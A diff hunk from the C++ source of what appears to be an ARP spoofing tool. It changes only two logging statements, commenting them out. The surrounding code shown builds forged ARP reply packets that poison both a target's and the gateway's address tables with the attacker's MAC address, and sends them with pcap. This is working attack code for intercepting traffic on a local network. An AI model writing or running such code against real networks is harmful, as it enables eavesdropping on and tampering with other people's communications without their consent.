@@ -186,14 +186,14 @@ void ArpSpoofer::spoof_target_thread(SpoofTarget* target) {
 
 void ArpSpoofer::send_arp_spoofing_packet(const SpoofTarget* target) {
     u_int8_t packet[sizeof(struct ether_header) + sizeof(struct arp_header)];
-    cout << "Spoofing " << target->get_ip_str() << ": using gateway IP.\n";
+    // cout << "Spoofing " << target->get_ip_str() << ": using gateway IP.\n";
     create_arp_packet(packet, attacker_mac, target->get_mac(), gateway_ip, target->get_ip(), 2);
     if (pcap_sendpacket(handle, packet, sizeof(packet)) != 0)
         cerr << "Failed to send spoof packet to target: " << pcap_geterr(handle) << "\n";
     else
         cout << "Spoof packet sent to target " << target->get_ip_str() << "\n";
     
-    cout << "Spoofing " << target->get_ip_str() << ": using target IP for gateway.\n";
+    // cout << "Spoofing " << target->get_ip_str() << ": using target IP for gateway.\n";
     create_arp_packet(packet, attacker_mac, gateway_mac, target->get_ip(), gateway_ip, 2);
     if (pcap_sendpacket(handle, packet, sizeof(packet)) != 0)
         cerr << "Failed to send spoof packet to gateway: " << pcap_geterr(handle) << "\n";
